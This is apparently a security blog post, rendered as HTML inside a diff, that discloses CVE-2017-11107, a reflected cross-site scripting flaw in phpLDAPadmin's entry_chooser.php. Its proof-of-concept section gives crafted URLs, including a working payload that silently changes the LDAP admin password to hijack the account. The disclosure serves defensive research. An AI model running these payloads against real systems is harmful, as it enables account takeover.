@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Hijacking phpLDAPadmin account using a Cross-site scripting vulnerability (CVE-2017-11107) | Ismail Belkacim</title>
+  <link rel = 'canonical' href = 'http://localhost:1313/posts/hijacking-phpldapadmin-xss/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:url" content="http://localhost:1313/posts/hijacking-phpldapadmin-xss/">
+  <meta property="og:site_name" content="Ismail Belkacim">
+  <meta property="og:title" content="Hijacking phpLDAPadmin account using a Cross-site scripting vulnerability (CVE-2017-11107)">
+  <meta property="og:description" content="Software Description phpLDAPadmin is an web-based LDAP adminstration interface for viewing and manipulating LDAP information.
+Vulnerability Description $request[&#39;form&#39;] and $request[&#39;rdn&#39;] parameters in file htdocs/entry_chooser.php aren’t properly sanitized before being displayed to the user, which allows a remote attacker to inject arbitrary HTML/JavaScript code in a user’s context.
+This vulnerability, if successfully exploited, can lead to data manipulation or information leakage as it is demonstrated in this PoC video:
+Proof of Concept (PoC) XSS via the form parameter:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2017-07-20T11:16:00+00:00">
+    <meta property="article:modified_time" content="2017-07-20T11:16:00+00:00">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hijacking phpLDAPadmin account using a Cross-site scripting vulnerability (CVE-2017-11107)">
+  <meta name="twitter:description" content="Software Description phpLDAPadmin is an web-based LDAP adminstration interface for viewing and manipulating LDAP information.
+Vulnerability Description $request[&#39;form&#39;] and $request[&#39;rdn&#39;] parameters in file htdocs/entry_chooser.php aren’t properly sanitized before being displayed to the user, which allows a remote attacker to inject arbitrary HTML/JavaScript code in a user’s context.
+This vulnerability, if successfully exploited, can lead to data manipulation or information leakage as it is demonstrated in this PoC video:
+Proof of Concept (PoC) XSS via the form parameter:">
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="http://localhost:1313/images/favicon.ico" />
+
+  
+  
+  
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-RBNXTCSVRS"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-RBNXTCSVRS');
+        }
+      </script>
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/projects">Projects</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" http://localhost:1313/posts/pwning-win-7-eternalblue/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="http://localhost:1313/posts/capture-the-ether-lotteries-write-up/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&text=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&title=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&is_video=false&description=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29&body=Check out this article: http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&title=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&title=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&name=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29&description=%3ch2%20id%3d%22software-description%22%3eSoftware%20Description%3c%2fh2%3e%0a%3cp%3ephpLDAPadmin%20is%20an%20web-based%20LDAP%20adminstration%20interface%20for%20viewing%20and%20manipulating%20LDAP%20information.%3c%2fp%3e%0a%3ch2%20id%3d%22vulnerability-description%22%3eVulnerability%20Description%3c%2fh2%3e%0a%3cp%3e%3ccode%3e%24request%5b%27form%27%5d%3c%2fcode%3e%20and%20%3ccode%3e%24request%5b%27rdn%27%5d%3c%2fcode%3e%20parameters%20in%20file%20%3ccode%3ehtdocs%2fentry_chooser.php%3c%2fcode%3e%20aren%26rsquo%3bt%20properly%20sanitized%20before%20being%20displayed%20to%20the%20user%2c%20which%20allows%20a%20remote%20attacker%20to%20inject%20arbitrary%20HTML%2fJavaScript%20code%20in%20a%20user%26rsquo%3bs%20context.%3c%2fp%3e%0a%3cscript%20src%3d%22https%3a%2f%2fgist.github.com%2fxd4rker%2f0bcac2062fe59df80b283790ad71b0c7.js%22%3e%3c%2fscript%3e%0a%3cp%3eThis%20vulnerability%2c%20if%20successfully%20exploited%2c%20can%20lead%20to%20data%20manipulation%20or%20information%20leakage%20as%20it%20is%20demonstrated%20in%20this%20PoC%20video%3a%3c%2fp%3e%0a%3cdiv%20style%3d%22position%3a%20relative%3b%20padding-bottom%3a%2056.25%25%3b%20height%3a%200%3b%20overflow%3a%20hidden%3b%22%3e%0a%20%20%20%20%20%20%3ciframe%20allow%3d%22accelerometer%3b%20autoplay%3b%20clipboard-write%3b%20encrypted-media%3b%20gyroscope%3b%20picture-in-picture%3b%20web-share%3b%20fullscreen%22%20loading%3d%22eager%22%20referrerpolicy%3d%22strict-origin-when-cross-origin%22%20src%3d%22https%3a%2f%2fwww.youtube.com%2fembed%2fWw7LD_bmH-o%3fautoplay%3d0%26amp%3bcontrols%3d1%26amp%3bend%3d0%26amp%3bloop%3d0%26amp%3bmute%3d0%26amp%3bstart%3d0%22%20style%3d%22position%3a%20absolute%3b%20top%3a%200%3b%20left%3a%200%3b%20width%3a%20100%25%3b%20height%3a%20100%25%3b%20border%3a0%3b%22%20title%3d%22YouTube%20video%22%3e%3c%2fiframe%3e%0a%20%20%20%20%3c%2fdiv%3e%0a%0a%3chr%3e%0a%3ch2%20id%3d%22proof-of-concept-poc%22%3eProof%20of%20Concept%20%28PoC%29%3c%2fh2%3e%0a%3cp%3e%3cstrong%3eXSS%20via%20the%20%3ccode%3eform%3c%2fcode%3e%20parameter%3a%3c%2fstrong%3e%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&t=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#software-description">Software Description</a></li>
+    <li><a href="#vulnerability-description">Vulnerability Description</a></li>
+    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Hijacking phpLDAPadmin account using a Cross-site scripting vulnerability (CVE-2017-11107)
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2017-07-20 11:16:00 &#43;0000 &#43;0000" itemprop="datePublished">2017-07-20</time>
+          
+        </div>
+        
+        
+        
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h2 id="software-description">Software Description</h2>
+<p>phpLDAPadmin is an web-based LDAP adminstration interface for viewing and manipulating LDAP information.</p>
+<h2 id="vulnerability-description">Vulnerability Description</h2>
+<p><code>$request['form']</code> and <code>$request['rdn']</code> parameters in file <code>htdocs/entry_chooser.php</code> aren&rsquo;t properly sanitized before being displayed to the user, which allows a remote attacker to inject arbitrary HTML/JavaScript code in a user&rsquo;s context.</p>
+<script src="https://gist.github.com/xd4rker/0bcac2062fe59df80b283790ad71b0c7.js"></script>
+<p>This vulnerability, if successfully exploited, can lead to data manipulation or information leakage as it is demonstrated in this PoC video:</p>
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/Ww7LD_bmH-o?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
+
+<hr>
+<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
+<p><strong>XSS via the <code>form</code> parameter:</strong></p>
+<pre tabindex="0"><code class="language-https://github.com/leenooks/phpLDAPadmin/issues/50" data-lang="https://github.com/leenooks/phpLDAPadmin/issues/50">http://localhost:8888/phpldapadmin/entry_chooser.php?form=advanced_search_form%22).base;%27);}%20alert(1);%20function%20lol()%20{%20isNaN(%27&amp;element=base&amp;rdn=test
+</code></pre><p><strong>XSS via the <code>rdn</code> parameter (needs Chrome&rsquo;s XSS Auditor bypass):</strong></p>
+<pre tabindex="0"><code>http://localhost:8888/phpldapadmin/entry_chooser.php?form=advanced_search_form&amp;element=base&amp;rdn=test%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+</code></pre><p><strong>Changing admin password to <code>1337</code>:</strong></p>
+<pre tabindex="0"><code>%22).base;%27);}%20var%20http=new%20XMLHttpRequest();%20var%20url=%22http://localhost:8888/phpldapadmin/cmd.php%22;%20var%20params=%22cmd%3Dupdate%2526server_id%3D1%2526dn%3Dcn%25253D&lt;LOGIN_DN&gt;%2526new_values%25255Buserpassword%25255D%25255B0%25255D%3D%25257BSSHA%25257Dxtzm0RhdgidTmNnRD0rvUdjCcGhPQgKa%22;%20http.open(%22POST%22,%20url,%20true);%20http.setRequestHeader(%22Content-type%22,%20%22application/x-www-form-urlencoded%22);%20http.send(params);%20function%20lol()%20{%20isNaN(%27
+</code></pre><p><strong><code>&lt;LOGIN_DN&gt;</code></strong>: Triple URL-encoded login DN (e.g., <code>cn%253Dadmin%252Cdc%253Dldap%252Cdc%253Dcom</code>)</p>
+<p><strong>PoC URL:</strong></p>
+<pre tabindex="0"><code> http://localhost:8888/phpldapadmin/entry_chooser.php?form=advanced_search_form%22).base;%27);}%20var%20http=new%20XMLHttpRequest();%20var%20url=%22http://localhost:8888/phpldapadmin/cmd.php%22;%20var%20params=%22cmd%3Dupdate%2526server_id%3D1%2526dn%3Dcn%25253Dadmin%25252Cdc%25253Dldap%25252Cdc%25253Dcom%2526new_values%25255Buserpassword%25255D%25255B0%25255D%3D%25257BSSHA%25257Dxtzm0RhdgidTmNnRD0rvUdjCcGhPQgKa%22;%20http.open(%22POST%22,%20url,%20true);%20http.setRequestHeader(%22Content-type%22,%20%22application/x-www-form-urlencoded%22);%20http.send(params);%20function%20lol()%20{%20isNaN(%27&amp;element=base&amp;rdn=test
+</code></pre><p><strong>References:</strong></p>
+<ul>
+<li><a href="https://bugs.launchpad.net/ubuntu/+source/phpldapadmin/+bug/1701731">https://bugs.launchpad.net/ubuntu/+source/phpldapadmin/+bug/1701731</a></li>
+<li><a href="https://github.com/leenooks/phpLDAPadmin/issues/50">https://github.com/leenooks/phpLDAPadmin/issues/50</a>
+<a href="https://github.com/leenooks/phpLDAPadmin/issues/50">https://github.com/leenooks/phpLDAPadmin/issues/50</a></li>
+</ul>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Posts</a></li>
+         
+          <li><a href="/projects">Projects</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#software-description">Software Description</a></li>
+    <li><a href="#vulnerability-description">Vulnerability Description</a></li>
+    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&text=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&title=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&is_video=false&description=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29&body=Check out this article: http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&title=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&title=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&name=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29&description=%3ch2%20id%3d%22software-description%22%3eSoftware%20Description%3c%2fh2%3e%0a%3cp%3ephpLDAPadmin%20is%20an%20web-based%20LDAP%20adminstration%20interface%20for%20viewing%20and%20manipulating%20LDAP%20information.%3c%2fp%3e%0a%3ch2%20id%3d%22vulnerability-description%22%3eVulnerability%20Description%3c%2fh2%3e%0a%3cp%3e%3ccode%3e%24request%5b%27form%27%5d%3c%2fcode%3e%20and%20%3ccode%3e%24request%5b%27rdn%27%5d%3c%2fcode%3e%20parameters%20in%20file%20%3ccode%3ehtdocs%2fentry_chooser.php%3c%2fcode%3e%20aren%26rsquo%3bt%20properly%20sanitized%20before%20being%20displayed%20to%20the%20user%2c%20which%20allows%20a%20remote%20attacker%20to%20inject%20arbitrary%20HTML%2fJavaScript%20code%20in%20a%20user%26rsquo%3bs%20context.%3c%2fp%3e%0a%3cscript%20src%3d%22https%3a%2f%2fgist.github.com%2fxd4rker%2f0bcac2062fe59df80b283790ad71b0c7.js%22%3e%3c%2fscript%3e%0a%3cp%3eThis%20vulnerability%2c%20if%20successfully%20exploited%2c%20can%20lead%20to%20data%20manipulation%20or%20information%20leakage%20as%20it%20is%20demonstrated%20in%20this%20PoC%20video%3a%3c%2fp%3e%0a%3cdiv%20style%3d%22position%3a%20relative%3b%20padding-bottom%3a%2056.25%25%3b%20height%3a%200%3b%20overflow%3a%20hidden%3b%22%3e%0a%20%20%20%20%20%20%3ciframe%20allow%3d%22accelerometer%3b%20autoplay%3b%20clipboard-write%3b%20encrypted-media%3b%20gyroscope%3b%20picture-in-picture%3b%20web-share%3b%20fullscreen%22%20loading%3d%22eager%22%20referrerpolicy%3d%22strict-origin-when-cross-origin%22%20src%3d%22https%3a%2f%2fwww.youtube.com%2fembed%2fWw7LD_bmH-o%3fautoplay%3d0%26amp%3bcontrols%3d1%26amp%3bend%3d0%26amp%3bloop%3d0%26amp%3bmute%3d0%26amp%3bstart%3d0%22%20style%3d%22position%3a%20absolute%3b%20top%3a%200%3b%20left%3a%200%3b%20width%3a%20100%25%3b%20height%3a%20100%25%3b%20border%3a0%3b%22%20title%3d%22YouTube%20video%22%3e%3c%2fiframe%3e%0a%20%20%20%20%3c%2fdiv%3e%0a%0a%3chr%3e%0a%3ch2%20id%3d%22proof-of-concept-poc%22%3eProof%20of%20Concept%20%28PoC%29%3c%2fh2%3e%0a%3cp%3e%3cstrong%3eXSS%20via%20the%20%3ccode%3eform%3c%2fcode%3e%20parameter%3a%3c%2fstrong%3e%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fhijacking-phpldapadmin-xss%2f&t=Hijacking%20phpLDAPadmin%20account%20using%20a%20Cross-site%20scripting%20vulnerability%20%28CVE-2017-11107%29" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2025  Ismail Belkacim 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/projects">Projects</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
